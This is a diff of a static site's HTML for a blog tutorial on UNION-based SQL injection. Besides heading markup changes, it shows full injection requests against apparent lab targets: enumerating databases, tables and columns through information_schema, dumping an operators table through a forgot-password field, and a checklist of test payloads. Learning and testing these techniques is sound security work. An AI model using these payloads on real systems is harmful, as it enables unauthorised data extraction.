-<h3 id="number-of-columns">Number of Columns</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="number-of-columns">
+
+
+<h3 class="header-anchor-wrapper">Number of Columns
+  <a href="#number-of-columns" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>We&rsquo;ll send a set of <code>UNION</code> requests to identify number of columns like follows:</p>
 <pre  class="mc-prism hide language-text" ><code>http://10.10.10.31/singlepost.php?id=11 UNION SELECT 1-- -
 </code></pre>
@@ -790,7 +1046,30 @@ To do that we can ask the webpage to load a non-existent post (a random <code>id
 <p><em>Note</em>: The number of columns printed out on the screen isn&rsquo;t necessary to be matched by the UNION query, but the number of columns the table actually has. You can see here that only four things are getting printed on here, &ldquo;1&rdquo; isn&rsquo;t getting printed out at all.</p>
 <p>We can see that fifth column printed out first as title of the post, third and second column as author and date respectively in tiny font, and then the fourth column which has quite some space to put text in as it is used for the post of the blog.</p>
 <p>Now that we have column position on hand, we can start dumping data out on the screen.</p>
-<h3 id="enumerating-database">Enumerating Database</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="enumerating-database">
+
+
+<h3 class="header-anchor-wrapper">Enumerating Database
+  <a href="#enumerating-database" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>Let&rsquo;s look at the version of the MySQL database. We can use MySQL internal functions at our advantage here.</p>
 <p><img src="/sqli-0x02/11_version.png" alt="DB Version"></p>
 <p>Let&rsquo;s check out the name of the database we&rsquo;re using. In database systems, you can use multiple databases (within a single database management system like MySQL) under different user contexts.</p>
@@ -799,7 +1078,30 @@ To do that we can ask the webpage to load a non-existent post (a random <code>id
 <p>Let&rsquo;s take a look at the user we are running as.</p>
 <p><img src="/sqli-0x02/13_blog_union_user.png" alt="User Found"></p>
 <p>We are running as &ldquo;freeeze@localhost&rdquo;. Not so useful, let&rsquo;s move on.</p>
-<h3 id="enumerating-tables">Enumerating Tables</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="enumerating-tables">
+
+
+<h3 class="header-anchor-wrapper">Enumerating Tables
+  <a href="#enumerating-tables" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>Now we want to know what tables exist in the database we are using.</p>
 <p>In SQL we can list down tables and columns that exist in the database. In MySQL, there are a set of tables called as <em><strong>information_schema</strong></em> tables which holds all the &ldquo;metadata&rdquo; or useful information for the database to function properly.</p>
 <p>The most commonly used tables of <em><strong>information_schema</strong></em> set are:</p>
@@ -824,13 +1126,59 @@ SELECT 1,2,3,4,GROUP_CONCAT(0x7c,table_name,0x7c) FROM information_schema.tables
 <p>Output of the above request</p>
 <p><img src="/sqli-0x02/15_blog_union_current_db_table.png" alt="Table Found"></p>
 <p>Apparently this particular database only has one table, although we can guess that it&rsquo;s not of any use let&rsquo;s take a look at it anyway.</p>
-<h3 id="enumerating-columns">Enumerating Columns</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="enumerating-columns">
+
+
+<h3 class="header-anchor-wrapper">Enumerating Columns
+  <a href="#enumerating-columns" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>We leverage the use of <em>information_schema.columns</em> table to get all the columns from the table <em>blog</em> we found earlier.</p>
 <p>Request sent:</p>
 <pre  class="mc-prism hide language-text" ><code class="language-SQL">http://10.10.10.31/singlepost.php?id=191+UNION+SELECT+1,2,3,group_concat(0x7c,column_name,0x7c),5+FROM+information_schema.columns+WHERE+table_name='blog'--+-
 </code></pre>
 <p><img src="/sqli-0x02/16_columns_blog.png" alt="Columns Found"></p>
-<h3 id="getting-contents">Getting Contents</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="getting-contents">
+
+
+<h3 class="header-anchor-wrapper">Getting Contents
+  <a href="#getting-contents" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>Before printing out everything, let&rsquo;s find out the number of rows present in the table. On the website, it showed only 3 posts, it could be a possibility that there are hidden posts present here.</p>
 <p>Let&rsquo;s take a count of <code>id</code> column as that column has to be present in a table.</p>
 <p>Request sent:</p>
@@ -847,7 +1195,30 @@ SELECT 1,2,3,4,GROUP_CONCAT(0x7c,table_name,0x7c) FROM information_schema.tables
 <pre  class="mc-prism hide language-text" ><code class="language-SQL">SELECT title, author, date, text FROM blog WHERE id=191 UNION SELECT 1,2,3,group_concat('\r\n',0x7c,id,0x7c,'\r\n',text),5 FROM blog--+-
 </code></pre>
 <p>Unlike before I used the fourth column to print all the entries out at once because printing it out in any other column would not provide much space to fit all that text.</p>
-<h2 id="example-2---forgot-password">Example 2 - Forgot Password</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="example-2---forgot-password">
+
+
+<h2 class="header-anchor-wrapper">Example 2 - Forgot Password
+  <a href="#example-2---forgot-password" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <p>In order to avoid breaking the flow of the previous example, I decided to put the second example at the end in which I&rsquo;ll cover testing as well as exploitation.</p>
 <p>Unlike the previous example where it was quite obvious that the parameter was vulnerable and was using GET requests, let&rsquo;s take a look at a forgot password functonality which uses a POST request and has some minor filtering in place.</p>
 <p>Before moving onto testing a certain functionality it&rsquo;s important to understand that functionality. Let&rsquo;s take a look at how this particular input field can be interacted.</p>
@@ -858,7 +1229,30 @@ SELECT 1,2,3,4,GROUP_CONCAT(0x7c,table_name,0x7c) FROM information_schema.tables
 <p>By sending &ldquo;<a href="mailto:test@test.com">test@test.com</a>&rdquo; a different error is prompted - &ldquo;user not found&rdquo;. Ok, great, we can perform user enumeration.</p>
 <p><img src="/sqli-0x02/21_user_enum.png" alt="User Enumeration Possible"></p>
 <p>Now that the validation requirement is met, let&rsquo;s try sending special SQL characters like the ones stated above to test it out.</p>
-<h3 id="vulnerability-testing-1">Vulnerability Testing</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="vulnerability-testing-1">
+
+
+<h3 class="header-anchor-wrapper">Vulnerability Testing
+  <a href="#vulnerability-testing-1" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>I&rsquo;ll be showing the screenshots of BurpSuite Repeater since the data sent in the POST request is not visible on the webpage.</p>
 <ol>
 <li>Single-quote - <code>'</code>
@@ -903,7 +1297,30 @@ The request I sent for testing was:</li>
 </code></pre>
 <p>Unfortunately the responses were received right away. Sleep test did not turn out as expected.</p>
 <p>So far we know that we were successfully able to inject a single-quote and a comment. Let&rsquo;s build a little on that to see if we could actually inject and gain something useful out of it.</p>
-<h4 id="number-of-columns-1">Number Of Columns</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="number-of-columns-1">
+
+
+<h4 class="header-anchor-wrapper">Number Of Columns
+  <a href="#number-of-columns-1" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <p>This process as such comes under the enumeration part of the exploitation of SQL injection, but it can also act as a sure indicator that we actually can perform injections. If we can enumerate number of columns present in this table we can go further.</p>
 <p>Unlike last time, let&rsquo;s use another method to get the number of columns - <code>ORDER BY</code>.
 In <code>UNION</code>, you are presented with an error till the number of columns in the table and the columns in your SELECT statement are not equal, you combine two tables into one.
@@ -917,12 +1334,81 @@ Just like UNION, ORDER BY can also work on the basis of index of the column and 
 <p>Ok, it has one column, let&rsquo;s check if it has more. We&rsquo;ll append a number and then repeat the earlier request till we get some sort of error.</p>
 <p><img src="/sqli-0x02/27_orderby_2.png" alt="ORDER BY Column Error"></p>
 <p>As we repeat the process, we encounter an error when we try to sort the output of the table as per column #5. This indicates that we actually do have an injectable parameter which we can proceed with, and also that the table has only four columns to work with.</p>
-<h3 id="vulnerability-exploitation---union-attacks">Vulnerability Exploitation - UNION Attacks</h3>
-<h4 id="backend-query-1">Backend Query</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="vulnerability-exploitation---union-attacks">
+
+
+<h3 class="header-anchor-wrapper">Vulnerability Exploitation - UNION Attacks
+  <a href="#vulnerability-exploitation---union-attacks" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="backend-query-1">
+
+
+<h4 class="header-anchor-wrapper">Backend Query
+  <a href="#backend-query-1" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <p>Since this functionality is taking in email address and checking if the username is found, let&rsquo;s estimate a query that the backend PHP code is using</p>
 <pre  class="mc-prism hide language-text" ><code class="language-SQL">SELECT username FROM users WHERE email = 'user_input';
 </code></pre>
-<h4 id="number-of-columns-2">Number of Columns</h4>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="number-of-columns-2">
+
+
+<h4 class="header-anchor-wrapper">Number of Columns
+  <a href="#number-of-columns-2" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h4>
+
 <p>Our next step would have been to find the number of columns which we already did earlier (using <code>ORDER BY</code>), finding four columns, but we did not determine which column number is printable, so let&rsquo;s do that.</p>
 <p>To find a printable column, we&rsquo;ll need to use a <code>UNION</code> clause. We can send the same request as the ORDER BY clause, replacing &ldquo;ORDER BY&rdquo; with &ldquo;UNION SELECT&rdquo;</p>
 <p>Request sent:</p>
@@ -941,7 +1427,30 @@ Just like UNION, ORDER BY can also work on the basis of index of the column and 
 <p>We&rsquo;ll repeat this, and soon find out that the fourth column is that of email</p>
 <p><img src="/sqli-0x02/28_union_4.png" alt="Found The Right Column"></p>
 <p>Not only did we meet the email requirement of our new SELECT statement, but also found the column which is printable!</p>
-<h3 id="enumerating-database-1">Enumerating Database</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="enumerating-database-1">
+
+
+<h3 class="header-anchor-wrapper">Enumerating Database
+  <a href="#enumerating-database-1" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>Printing out information in this would a little tricky as we have to maintain the email format to meet the validation requirement.</p>
 <p>Let&rsquo;s start by printing out the name of the database we are using.</p>
 <p>Request sent:</p>
@@ -960,7 +1469,30 @@ Just like UNION, ORDER BY can also work on the basis of index of the column and 
 <p>Let&rsquo;s take a look at the user we are running as:</p>
 <p><img src="/sqli-0x02/30_db_user.png" alt="DB User"></p>
 <p>We are running as &ldquo;supercms@localhost&rdquo;. Not so useful, let&rsquo;s move on.</p>
-<h3 id="enumerating-tables-1">Enumerating Tables</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="enumerating-tables-1">
+
+
+<h3 class="header-anchor-wrapper">Enumerating Tables
+  <a href="#enumerating-tables-1" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>Let&rsquo;s take a count of the tables that exist in the current database we&rsquo;re using.</p>
 <p>Request:</p>
 <pre  class="mc-prism hide language-text" ><code>test@test.com' UnIoN SELECT 1,2,3,CONCAT('\r\n',count(table_name),'\r\n','@test.com') FROM information_schema.tables WHERE table_schema=database()-- -
@@ -972,7 +1504,30 @@ Just like UNION, ORDER BY can also work on the basis of index of the column and 
 </code></pre>
 <p><img src="/sqli-0x02/32_list_tables.png" alt="Tables List"></p>
 <p>From the output above we can see that we have three tables. Let&rsquo;s see what columns each table has</p>
-<h3 id="enumerating-columns-1">Enumerating Columns</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="enumerating-columns-1">
+
+
+<h3 class="header-anchor-wrapper">Enumerating Columns
+  <a href="#enumerating-columns-1" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>Let&rsquo;s look at the columns of the first table - groups</p>
 <p>Request:</p>
 <pre  class="mc-prism hide language-text" ><code>test%40test.com'+UnIoN+SELECT+1,2,3,CONCAT('\r\n','\r\n',group_concat(0x7c,column_name,0x7c,'\r\n'),'\r\n','%40test.com')+FROM+information_schema.columns+WHERE+table_name%3d'groups'--+-
@@ -1000,7 +1555,30 @@ Just like UNION, ORDER BY can also work on the basis of index of the column and 
 <p>Output:</p>
 <p><img src="/sqli-0x02/33_col4.png" alt="Getting &ldquo;username&rdquo; Column With Wildcard"></p>
 <p>Since we used a wildcard, we get the results from any column that has user in it, but it does get things done quicker.</p>
-<h3 id="getting-content">Getting Content</h3>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="getting-content">
+
+
+<h3 class="header-anchor-wrapper">Getting Content
+  <a href="#getting-content" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h3>
+
 <p>Before we dive into dumping information out, it&rsquo;s always a good idea take a count of things. With that said, let&rsquo;s take a count of id of the operators table before we start dumping everything.</p>
 <p>Request:</p>
 <pre  class="mc-prism hide language-text" ><code>test%40test.com'+UnIoN+SELECT+1,2,3,CONCAT('\r\n','\r\n',count(id),'\r\n','\r\n','%40test.com')+FROM+operators--+-
@@ -1070,7 +1648,30 @@ for i in range(0,202):
 <li><a href="https://hashes.org/search.php">https://hashes.org/search.php</a></li>
 <li><a href="https://hashes.com/en/decrypt/hash">https://hashes.com/en/decrypt/hash</a></li>
 </ol>
-<h2 id="summary">Summary</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="summary">
+
+
+<h2 class="header-anchor-wrapper">Summary
+  <a href="#summary" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <p>To summarize the post:</p>
 <ol>
 <li>To start with testing for SQL injection points, it&rsquo;s necessary to sift through the application and make note of all the user input fields and parameters.</li>
@@ -1080,75 +1681,75 @@ for i in range(0,202):
 </ol>
 <p><strong>Testing checklist</strong>:</p>
 <table class="mc-table">
-<thead>
-<tr>
-<th>Name</th>
-<th>Character</th>
-<th>Function</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Single quote</td>
-<td><code>'</code></td>
-<td>String terminator</td>
-</tr>
-<tr>
-<td>Semi colon</td>
-<td><code>;</code></td>
-<td>Query terminator</td>
-</tr>
-<tr>
-<td>Comment</td>
-<td><code>-- -</code></td>
-<td>Removing rest of the query</td>
-</tr>
-<tr>
-<td>Single quote with a comment</td>
-<td><code>'-- -</code></td>
-<td>End a string and remove rest of the query</td>
-</tr>
-<tr>
-<td>Single quote, semi colon and a comment</td>
-<td><code>';-- -</code></td>
-<td>End a string, end query, and remove rest of the query</td>
-</tr>
-<tr>
-<td>OR operator</td>
-<td><code>OR 1=1-- -</code></td>
-<td>For integers, <code>true</code> test</td>
-</tr>
-<tr>
-<td>OR operator</td>
-<td><code>OR 1=2-- -</code></td>
-<td>For integers, <code>false</code> test</td>
-</tr>
-<tr>
-<td>OR operator</td>
-<td><code>' OR '1'='1'-- -</code></td>
-<td>For strings, <code>test</code> test</td>
-</tr>
-<tr>
-<td>AND operator</td>
-<td><code>AND 1=1-- -</code></td>
-<td>For integers, <code>true</code> test</td>
-</tr>
-<tr>
-<td>AND operator</td>
-<td><code>AND 1=2-- -</code></td>
-<td>For integers, <code>false</code> test</td>
-</tr>
-<tr>
-<td>AND operator</td>
-<td><code>' AND '1'='1'-- -</code></td>
-<td>For strings, <code>true</code> test</td>
-</tr>
-<tr>
-<td>Sleep function</td>
-<td><code>OR sleep(5)-- -</code></td>
-<td>Blind test</td>
-</tr>
-</tbody>
+  <thead>
+      <tr>
+          <th>Name</th>
+          <th>Character</th>
+          <th>Function</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Single quote</td>
+          <td><code>'</code></td>
+          <td>String terminator</td>
+      </tr>
+      <tr>
+          <td>Semi colon</td>
+          <td><code>;</code></td>
+          <td>Query terminator</td>
+      </tr>
+      <tr>
+          <td>Comment</td>
+          <td><code>-- -</code></td>
+          <td>Removing rest of the query</td>
+      </tr>
+      <tr>
+          <td>Single quote with a comment</td>
+          <td><code>'-- -</code></td>
+          <td>End a string and remove rest of the query</td>
+      </tr>
+      <tr>
+          <td>Single quote, semi colon and a comment</td>
+          <td><code>';-- -</code></td>
+          <td>End a string, end query, and remove rest of the query</td>
+      </tr>
+      <tr>
+          <td>OR operator</td>
+          <td><code>OR 1=1-- -</code></td>
+          <td>For integers, <code>true</code> test</td>
+      </tr>
+      <tr>
+          <td>OR operator</td>
+          <td><code>OR 1=2-- -</code></td>
+          <td>For integers, <code>false</code> test</td>
+      </tr>
+      <tr>
+          <td>OR operator</td>
+          <td><code>' OR '1'='1'-- -</code></td>
+          <td>For strings, <code>test</code> test</td>
+      </tr>
+      <tr>
+          <td>AND operator</td>
+          <td><code>AND 1=1-- -</code></td>
+          <td>For integers, <code>true</code> test</td>
+      </tr>
+      <tr>
+          <td>AND operator</td>
+          <td><code>AND 1=2-- -</code></td>
+          <td>For integers, <code>false</code> test</td>
+      </tr>
+      <tr>
+          <td>AND operator</td>
+          <td><code>' AND '1'='1'-- -</code></td>
+          <td>For strings, <code>true</code> test</td>
+      </tr>
+      <tr>
+          <td>Sleep function</td>
+          <td><code>OR sleep(5)-- -</code></td>
+          <td>Blind test</td>
+      </tr>
+  </tbody>
 </table>
 <p><strong>UNION attack hack steps</strong>:</p>
 <ol>
@@ -1164,11 +1765,35 @@ for i in range(0,202):
 <li>Get data</li>
 <li>Automate queries</li>
 </ol>
-<h2 id="fin">Fin</h2>
+</section>
+    
+        
+        
+            
+            
+            
+        
+        <section id="fin">
+
+
+<h2 class="header-anchor-wrapper">Fin
+  <a href="#fin" class="header-anchor-link">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="1rem" height="1rem" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</a>
+</h2>
+
 <p>If you would like to learn more, you can move on to the third post - <a href="/sqli-0x03">SQL Injection 0x03 - Blind Boolean Attacks</a></p>
 <p>If some part of this post feels unexplained or you did not understand, feel free to contact me :)
 Have a great day, take care, and hack the planet!</p>
-
+</section>
+    
 </article>
 </div>
 
@@ -1198,11 +1823,13 @@ Have a great day, take care, and hack the planet!</p>
 </div>
 
                 
+
+                
             </div>
+        </main>
 <footer>
     <article>Made with love...and copious amounts of coffee</article>
 </footer>
 
-</main>
-    </body>
+</body>
 </html>
